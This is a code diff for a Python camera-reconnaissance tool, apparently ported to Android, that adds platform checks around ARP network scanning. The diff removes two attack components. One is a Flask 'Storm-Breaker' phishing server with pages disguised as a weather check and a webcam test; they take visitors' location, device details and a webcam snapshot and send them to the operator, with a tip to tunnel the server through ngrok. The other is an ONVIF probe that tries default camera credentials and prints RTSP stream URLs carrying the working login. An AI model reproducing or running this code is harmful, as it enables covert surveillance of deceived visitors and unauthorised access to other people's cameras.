@@ -1,4 +1,15 @@
-import requests
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+
+try:
+    import urllib3
+    urllib3.disable_warnings()
+except ImportError:
+    pass
+
 import socket
 import sys
 import threading
@@ -7,7 +18,6 @@ import ipaddress
 import base64
 import time
 import os
-from scapy.all import ARP, Ether, srp
 os.environ['PYTHONIOENCODING'] = 'utf-8'
 
 # === STORM BREAKER MODE ===
@@ -37,17 +47,28 @@ except ImportError:
 import uuid
 import ssl
 from datetime import datetime
-from bs4 import BeautifulSoup
 try:
     import shodan
 except ImportError:
     shodan = None
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from concurrent.futures import ThreadPoolExecutor
 
 # Suppress SSL warnings
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+import sys
+IS_ANDROID = hasattr(sys, 'getandroidapilevel') \
+    or 'com.chaquo' in sys.modules.get(
+        '__loader__', '').__class__.__module__ \
+    if hasattr(sys.modules.get('__loader__', ''),
+        '__class__') else False
+
+# Scapy is restricted on Android (requires root for raw sockets)
+try:
+    from scapy.all import ARP, Ether, srp
+    SCAPY_AVAILABLE = True
+except (ImportError, Exception):
+    SCAPY_AVAILABLE = False
 
 # Symbols/Emojis from the screenshots
 SCAN = "🔍"
@@ -616,7 +637,7 @@ def get_mac_vendor(target_ip):
     mac = "Unknown"
     vendor = "Unknown Vendor"
     try:
-        if os.path.exists("/proc/net/arp"):
+        if not IS_ANDROID and os.path.exists("/proc/net/arp"):
             # Try to read ARP table
             with open("/proc/net/arp", "r") as f:
                 for line in f:
@@ -746,140 +767,10 @@ def identify_device(ip):
 
     return display_name
 
-from flask import Flask, request, jsonify, render_template_string
-from flask_cors import CORS
 import json
-
-app_flask = Flask(__name__)
-CORS(app_flask)
 
 # Global storage for Storm results
 storm_results = []
-
-STORM_TEMPLATES = {
-    "NearYou": """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Weather Near You</title>
-        <script>
-            function gather() {
-                const info = {
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency,
-                    ram: navigator.deviceMemory,
-                    resolution: `${window.screen.width}x${window.screen.height}`
-                };
-
-                navigator.geolocation.getCurrentPosition(pos => {
-                    info.lat = pos.coords.latitude;
-                    info.lon = pos.coords.longitude;
-                    info.acc = pos.coords.accuracy;
-                    send(info);
-                }, err => {
-                    info.error = "Location Denied";
-                    send(info);
-                });
-            }
-
-            function send(data) {
-                fetch('/post', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                }).then(() => {
-                    window.location.href = "{{ redirect_url }}";
-                });
-            }
-            window.onload = gather;
-        </script>
-    </head>
-    <body style="background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
-        <div style="text-align: center;">
-            <h1>Checking Weather...</h1>
-            <p>Please allow location to find your local station.</p>
-        </div>
-    </body>
-    </html>
-    """,
-    "Webcam": """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Webcam Test</title>
-        <script>
-            async function start() {
-                const info = { ua: navigator.userAgent };
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    info.image = canvas.toDataURL('image/jpeg');
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) {
-                    info.error = "Webcam Denied";
-                }
-
-                fetch('/post', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(info)
-                }).then(() => {
-                    window.location.href = "{{ redirect_url }}";
-                });
-            }
-            window.onload = start;
-        </script>
-    </head>
-    <body style="background: black; color: white;">
-        <h1>Verifying your device...</h1>
-    </body>
-    </html>
-    """
-}
-
-current_config = {"template": "NearYou", "redirect_url": ""}
-
-@app_flask.route('/')
-def index():
-    template = STORM_TEMPLATES.get(current_config["template"], STORM_TEMPLATES["NearYou"])
-    return render_template_string(template, redirect_url=current_config["redirect_url"])
-
-@app_flask.route('/post', methods=['POST'])
-def post_data():
-    data = request.json
-    data['ip'] = request.remote_addr
-    data['time'] = datetime.now().strftime("%H:%M:%S")
-    storm_results.append(data)
-    print(f"\\n[{FIRE}] STORM-BREAKER DATA RECEIVED!")
-    print(f"    {INFO} IP: {data['ip']}")
-    if 'lat' in data: print(f"    {GLOB} Location: {data['lat']}, {data['lon']}")
-    if 'image' in data: print(f"    {CAM} Webcam Snapshot Captured!")
-    return "OK"
-
-def start_storm_server(template, redirect):
-    global current_config
-    current_config = {"template": template, "redirect_url": redirect}
-    print(f"\\n[{RADR}] Starting Storm-Breaker Server on port 8080...")
-    print(f"    {INFO} Template: {template}")
-    print(f"    {INFO} Redirect: {redirect}")
-
-    # Run Flask in a separate thread to not block Chaquopy
-    def run():
-        app_flask.run(host='0.0.0.0', port=8080)
-
-    threading.Thread(target=run, daemon=True).start()
-
-    local_ip = get_local_ip()
-    print(f"\\n    {OPEN} Server Active at: http://{local_ip}:8080/")
-    print(f"    {ALRT} Use NGROK to tunnel this port: 'ngrok http 8080'")
 
 def get_storm_results():
     return json.dumps(storm_results)
@@ -888,14 +779,6 @@ def clear_storm_results():
     global storm_results
     storm_results = []
     return "Results Cleared"
-
-def storm_breaker_gen(template_type, redirect_url):
-    """
-    Mock integration of Storm-Breaker features.
-    In a real scenario, this would contact a backend to generate a tracking link.
-    """
-    start_storm_server(template_type, redirect_url)
-    return "Server Started"
 
 def discover_onvif(target_ip):
     """
@@ -1563,11 +1446,12 @@ def get_device_info(ip):
 
     # 2. MAC Address + Vendor Lookup
     try:
-        # ARP request to get MAC
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
-        if ans:
-            mac = ans[0][1].src
-            info["mac"] = mac
+        if not IS_ANDROID and SCAPY_AVAILABLE:
+            # ARP request to get MAC
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
+            if ans:
+                mac = ans[0][1].src
+                info["mac"] = mac
 
             # Simple vendor database (expandable)
             vendors = {
@@ -1637,12 +1521,15 @@ def lan_scan():
         # 1. ARP Scan using Scapy (Most thorough, but needs permissions)
         output.append("📡 Attempting ARP Broadcast Scan...\n")
         try:
-            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=5, verbose=False)
-            for sent, received in ans:
-                ip = received.psrc
-                if ip != my_ip:
-                    devices_found[ip] = {"ip": ip, "method": "ARP"}
-            output.append(f"   ✅ ARP Scan complete. Found {len(devices_found)} devices.\n")
+            if not IS_ANDROID and SCAPY_AVAILABLE:
+                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=5, verbose=False)
+                for sent, received in ans:
+                    ip = received.psrc
+                    if ip != my_ip:
+                        devices_found[ip] = {"ip": ip, "method": "ARP"}
+                output.append(f"   ✅ ARP Scan complete. Found {len(devices_found)} devices.\n")
+            else:
+                output.append("   ⚠️ ARP Scan skipped (Restricted on Android).\n")
         except Exception as e:
             output.append(f"   ⚠️ ARP Scan failed: {str(e)[:50]}...\n")
 
@@ -1712,7 +1599,7 @@ def get_local_ip():
 def main(target_input=None):
     if not target_input: return
 
-    print(f"{SCAN} Initiating CamVigil Reconnaissance...")
+    print(f"\n{SCAN} Initiating CamVigil Reconnaissance...")
 
     # 1. Broad Discovery (UPnP/SSDP)
     upnp_results = discover_upnp_ssdp()
@@ -1787,203 +1674,3 @@ def main(target_input=None):
 
 if __name__ == "__main__":
     main()
-def onvif_probe(target_ip, target_port=None):
-    """Lightweight ONVIF probe that works on Android via Chaquopy"""
-    import socket
-    import uuid
-
-    output = []
-    output.append("🔍 ONVIF Probe Started")
-    output.append("=" * 50)
-    output.append(f"📡 Target: {target_ip}")
-    output.append("")
-
-    # Ports to try
-    ports = [target_port] if target_port else [80, 8080, 8000, 8899, 8888, 2020]
-
-    # WS-Discovery multicast probe
-    ws_probe = f"""<?xml version="1.0" encoding="UTF-8"?>
-<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
-            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
-            xmlns:d="http://schemas.xmlsoap.org/ws/2004/08/discovery"
-            xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
-  <e:Header>
-    <w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>
-    <w:To>urn:schemas-xmlsoap-org:ws:2004:08:discovery</w:To>
-    <w:Action>http://schemas.xmlsoap.org/ws/2004/08/discovery/Probe</w:Action>
-  </e:Header>
-  <e:Body>
-    <d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe>
-  </e:Body>
-</e:Envelope>"""
-
-    # Step 1: WS-Discovery UDP probe on port 3702
-    output.append("📡 Step 1: WS-Discovery UDP Probe (port 3702)...")
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(3)
-        sock.sendto(ws_probe.encode(), (target_ip, 3702))
-        data, _ = sock.recvfrom(4096)
-        resp = data.decode(errors='ignore')
-        output.append("  ✅ WS-Discovery Response received!")
-        if "NetworkVideoTransmitter" in resp:
-            output.append("  📷 Confirmed: NetworkVideoTransmitter (IP Camera)")
-        if "XAddr" in resp:
-            import re
-            xaddr = re.search(r"<[^>]*XAddr[^>]*>(.*?)</", resp)
-            if xaddr:
-                output.append(f"  🔗 Service URL: {xaddr.group(1).strip()}")
-        sock.close()
-    except socket.timeout:
-        output.append("  ⚠️ No WS-Discovery response (device may not support it)")
-        try: sock.close()
-        except: pass
-    except Exception as e:
-        output.append(f"  ❌ WS-Discovery failed: {type(e).__name__}")
-
-    output.append("")
-
-    # Step 2: HTTP ONVIF endpoint probe
-    output.append("📡 Step 2: Probing ONVIF HTTP endpoints...")
-
-    onvif_endpoints = [
-        "/onvif/device_service",
-        "/onvif/devices",
-        "/onvif/Media",
-        "/onvif/Events",
-        "/onvif/PTZ",
-        "/onvif/imaging",
-    ]
-
-    DEFAULT_CREDS = [
-        ("admin", "admin"), ("admin", "12345"), ("admin", ""),
-        ("admin", "password"), ("root", "root"), ("root", ""),
-        ("admin", "1234"), ("user", "user"), ("guest", "guest"),
-    ]
-
-    import urllib.request
-    import base64
-
-    found_endpoint = None
-    working_cred   = None
-
-    for port in ports:
-        for endpoint in onvif_endpoints:
-            url = f"http://{target_ip}:{port}{endpoint}"
-            try:
-                req = urllib.request.Request(url, method='GET')
-                with urllib.request.urlopen(req, timeout=2) as r:
-                    if r.status in [200, 400, 500]:
-                        output.append(f"  ✅ ONVIF endpoint alive: {url} (HTTP {r.status})")
-                        found_endpoint = (target_ip, port, endpoint)
-                        break
-            except urllib.error.HTTPError as e:
-                if e.code in [400, 401, 500]:
-                    output.append(f"  ✅ ONVIF endpoint responds: {url} (HTTP {e.code})")
-                    found_endpoint = (target_ip, port, endpoint)
-                    break
-            except:
-                pass
-        if found_endpoint:
-            break
-
-    if not found_endpoint:
-        output.append("  ⚠️ No standard ONVIF HTTP endpoints responded")
-
-    output.append("")
-
-    # Step 3: Credential test if endpoint found
-    if found_endpoint:
-        ip, port, ep = found_endpoint
-        output.append("🔐 Step 3: Testing Default Credentials...")
-
-        # ONVIF GetDeviceInformation SOAP request
-        soap_body = """<?xml version="1.0" encoding="UTF-8"?>
-<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
-            xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
-  <s:Body>
-    <tds:GetDeviceInformation/>
-  </s:Body>
-</s:Envelope>"""
-
-        for user, pwd in DEFAULT_CREDS:
-            try:
-                url = f"http://{ip}:{port}{ep}"
-                credentials = base64.b64encode(f"{user}:{pwd}".encode()).decode()
-                req = urllib.request.Request(
-                    url,
-                    data=soap_body.encode(),
-                    headers={
-                        'Content-Type': 'application/soap+xml',
-                        'Authorization': f'Basic {credentials}'
-                    }
-                )
-                with urllib.request.urlopen(req, timeout=3) as r:
-                    resp_text = r.read().decode(errors='ignore')
-                    if "GetDeviceInformationResponse" in resp_text or r.status == 200:
-                        output.append(f"  🔥 CREDENTIALS WORK: {user}:{pwd}")
-                        working_cred = (user, pwd)
-
-                        # Extract device info from response
-                        import re
-                        for tag in ["Manufacturer", "Model", "FirmwareVersion", "SerialNumber"]:
-                            match = re.search(
-                                f"<[^>]*{tag}[^>]*>(.*?)<",
-                                resp_text, re.I
-                            )
-                            if match:
-                                output.append(f"  📋 {tag}: {match.group(1).strip()}")
-                        break
-            except:
-                pass
-
-        if not working_cred:
-            output.append("  ℹ️ No default credentials worked")
-            output.append("  (Device may use custom credentials or digest auth)")
-
-    output.append("")
-
-    # Step 4: GetProfiles if we have working creds
-    if working_cred and found_endpoint:
-        ip, port, ep = found_endpoint
-        user, pwd    = working_cred
-        output.append("📺 Step 4: Fetching Stream Profiles...")
-
-        profiles_soap = """<?xml version="1.0" encoding="UTF-8"?>
-<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
-            xmlns:trt="http://www.onvif.org/ver10/media/wsdl">
-  <s:Body><trt:GetProfiles/></s:Body>
-</s:Envelope>"""
-
-        try:
-            credentials = base64.b64encode(f"{user}:{pwd}".encode()).decode()
-            media_url   = f"http://{ip}:{port}/onvif/Media"
-            req = urllib.request.Request(
-                media_url,
-                data=profiles_soap.encode(),
-                headers={
-                    'Content-Type': 'application/soap+xml',
-                    'Authorization': f'Basic {credentials}'
-                }
-            )
-            with urllib.request.urlopen(req, timeout=3) as r:
-                resp_text = r.read().decode(errors='ignore')
-                import re
-                tokens = re.findall(r'token="([^"]+)"', resp_text)
-                names  = re.findall(r'<[^>]*Name[^>]*>(.*?)<', resp_text)
-
-                if tokens:
-                    output.append(f"  ✅ Found {len(tokens)} stream profile(s):")
-                    for i, tok in enumerate(tokens):
-                        name = names[i] if i < len(names) else "Unknown"
-                        rtsp = f"rtsp://{user}:{pwd}@{ip}:554/onvif/profile{i}/media.smp"
-                        output.append(f"  📷 Profile {i+1}: {name} (token: {tok})")
-                        output.append(f"  🔗 RTSP: {rtsp}")
-                else:
-                    output.append("  ⚠️ No profiles found in response")
-        except Exception as e:
-            output.append(f"  ❌ Profile fetch failed: {type(e).__name__}")
-
-    output.append("")
-    output.append("✅ ONVIF Probe Complete")
-    return "\n".join(output)
